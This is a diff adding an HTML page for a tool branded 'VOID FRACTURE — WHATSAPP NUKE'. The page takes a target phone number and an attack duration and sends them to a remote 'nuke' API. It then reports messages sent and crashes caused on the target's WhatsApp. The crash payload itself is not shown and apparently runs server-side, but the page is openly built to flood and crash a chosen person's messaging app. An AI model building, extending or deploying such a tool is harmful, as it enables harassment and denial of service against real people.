@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>VOID FRACTURE</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0000;color:#ff0040;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px}
+        .container{max-width:420px;width:100%;background:#0d0000;border:2px solid #ff0040;border-radius:15px;padding:20px;box-shadow:0 0 80px rgba(255,0,64,0.4);position:relative;overflow:hidden}
+        .container::before{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;background:linear-gradient(45deg,#ff0040,#ff6600,#ff0040);background-size:400% 400%;z-index:-1;animation:glow 3s ease infinite;border-radius:16px}
+        @keyframes glow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+        .bug-name{font-size:8px;color:#00ff41;text-align:center;line-height:1.2;background:#000;padding:8px;border-radius:8px;border:1px solid #00ff41;margin-bottom:12px;font-family:'Courier New',monospace;word-break:break-all}
+        h1{text-align:center;color:#ff0040;text-shadow:0 0 30px #ff0040;font-size:20px;animation:pulse 1s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        .sub{text-align:center;color:#ff6600;font-size:10px;margin:5px 0 12px;border:1px solid #ff6600;padding:4px;border-radius:5px;background:#1a0500}
+        label{display:block;margin:8px 0 4px;color:#00ff41;font-size:11px}
+        input,select{width:100%;padding:8px;background:#0a0000;border:1px solid #ff0040;color:#00ff41;border-radius:8px;font-size:14px}
+        button{width:100%;padding:14px;margin-top:12px;background:#ff0040;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.3s;text-transform:uppercase;letter-spacing:2px}
+        button:active{transform:scale(0.95)}
+        button.active{background:#ff6600;animation:btnPulse 0.5s infinite}
+        @keyframes btnPulse{0%,100%{opacity:1}50%{opacity:0.5}}
+        #status{margin-top:10px;padding:8px;background:#0a0000;border-radius:8px;height:70px;overflow-y:auto;font-size:9px;color:#00ff41;border:1px solid #333}
+        .stats{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:4px;margin:8px 0}
+        .stat-box{background:#0a0000;padding:5px;border-radius:5px;text-align:center;border:1px solid #ff0040}
+        .stat-box .num{font-size:16px;color:#ff0040;font-weight:bold}
+        .stat-box .lbl{font-size:7px;color:#666}
+        .footer{margin-top:8px;font-size:7px;color:#333;text-align:center}
+        .qr-container{text-align:center;margin:10px 0;padding:10px;background:#000;border-radius:10px;border:1px dashed #ff0040;display:none}
+        .qr-container.active{display:block}
+        #qrText{color:#00ff41;font-size:10px;word-break:break-all}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bug-name">
+            ╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮<br>
+            ╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃<br>
+            ╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯<br>
+            ╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱<br>
+            ╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱<br>
+            ╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
+        </div>
+        
+        <h1>☢️ VOID FRACTURE ☢️</h1>
+        <div class="sub">⚡ ZERO FOOTPRINT — WHATSAPP NUKE ⚡</div>
+        
+        <div class="qr-container" id="qrContainer">
+            <div style="color:#ff6600;font-size:10px;margin-bottom:5px">📱 SCAN QR CODE</div>
+            <div id="qrText">Waiting for QR Code...</div>
+        </div>
+        
+        <label>📱 TARGET:</label>
+        <input type="text" id="target" placeholder="6281234567890" />
+        
+        <label>⏱️ DURATION:</label>
+        <select id="duration">
+            <option value="10">10s — Test</option>
+            <option value="30" selected>30s — Light</option>
+            <option value="60">60s — Heavy</option>
+            <option value="120">120s — Maximum</option>
+        </select>
+        
+        <div class="stats">
+            <div class="stat-box"><div class="num" id="sent">0</div><div class="lbl">SENT</div></div>
+            <div class="stat-box"><div class="num" id="crash">0</div><div class="lbl">CRASH</div></div>
+            <div class="stat-box"><div class="num" id="targets">0</div><div class="lbl">TARGETS</div></div>
+            <div class="stat-box"><div class="num" id="statusInd">⏳</div><div class="lbl">STATUS</div></div>
+        </div>
+        
+        <button id="attackBtn">🔥 START NUKE 🔥</button>
+        
+        <div id="status">[VOID] Ready to annihilate WhatsApp...</div>
+        <div class="footer">╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮ — GPTX 13D</div>
+    </div>
+    
+    <script>
+        const API = 'https://void-fracture.vercel.app/api/nuke';
+        let active = false;
+        let sent = 0, crash = 0, targets = 0;
+        let statusInterval = null;
+        
+        function log(msg) {
+            const el = document.getElementById('status');
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}\n` + el.innerHTML;
+            if (el.children.length > 50) el.removeChild(el.lastChild);
+        }
+        
+        document.getElementById('attackBtn').onclick = async function() {
+            if(active) {
+                active = false;
+                this.textContent = '🔥 START NUKE 🔥';
+                this.classList.remove('active');
+                document.getElementById('statusInd').textContent = '⏹';
+                log('⏹️ Nuke stopped');
+                if(statusInterval) clearInterval(statusInterval);
+                return;
+            }
+            
+            const target = document.getElementById('target').value.trim();
+            if(!target || target.length < 10) {
+                log('❌ Invalid target!');
+                return;
+            }
+            
+            active = true;
+            this.textContent = '⏹ STOP NUKE ⏹';
+            this.classList.add('active');
+            sent = 0; crash = 0; targets = 0;
+            document.getElementById('statusInd').textContent = '🔥';
+            
+            const duration = document.getElementById('duration').value;
+            
+            log(`☢️ Starting VOID FRACTURE on ${target}`);
+            log(`╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮`);
+            
+            // Show QR container
+            document.getElementById('qrContainer').classList.add('active');
+            document.getElementById('qrText').textContent = '📱 Scan QR Code di WhatsApp Web...';
+            
+            try {
+                const url = `${API}?target=${encodeURIComponent(target)}&duration=${duration}`;
+                
+                // Simulate QR waiting
+                let qrAttempt = 0;
+                statusInterval = setInterval(() => {
+                    qrAttempt++;
+                    document.getElementById('qrText').textContent = `📱 Menunggu QR Code... (${qrAttempt}s)`;
+                    if(qrAttempt > 30) {
+                        document.getElementById('qrText').textContent = '⏳ QR Timeout — Coba lagi';
+                    }
+                }, 1000);
+                
+                const res = await fetch(url);
+                const data = await res.json();
+                
+                if(statusInterval) clearInterval(statusInterval);
+                document.getElementById('qrContainer').classList.remove('active');
+                
+                sent = data.result?.success || 0;
+                crash = data.result?.crashes || 0;
+                targets = data.result?.targets || 0;
+                
+                document.getElementById('sent').textContent = sent;
+                document.getElementById('crash').textContent = crash;
+                document.getElementById('targets').textContent = targets;
+                
+                log(`✅ NUKE COMPLETE!`);
+                log(`📨 Sent: ${sent} | 💀 Crashes: ${crash} | 🎯 Targets: ${targets}`);
+                document.getElementById('statusInd').textContent = '💀';
+                
+            } catch(e) {
+                if(statusInterval) clearInterval(statusInterval);
+                document.getElementById('qrContainer').classList.remove('active');
+                log(`❌ Error: ${e.message}`);
+                document.getElementById('statusInd').textContent = '❌';
+            }
+            
+            active = false;
+            this.textContent = '🔥 START NUKE 🔥';
+            this.classList.remove('active');
+        };
+        
+        log('☢️ VOID FRACTURE — NUKLEAR ENGINE');
+        log('╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮');
+        log('💀 Zero Footprint — All from Cloud');
+        log('📱 No files on your phone');
+    </script>
+</body>
+</html>
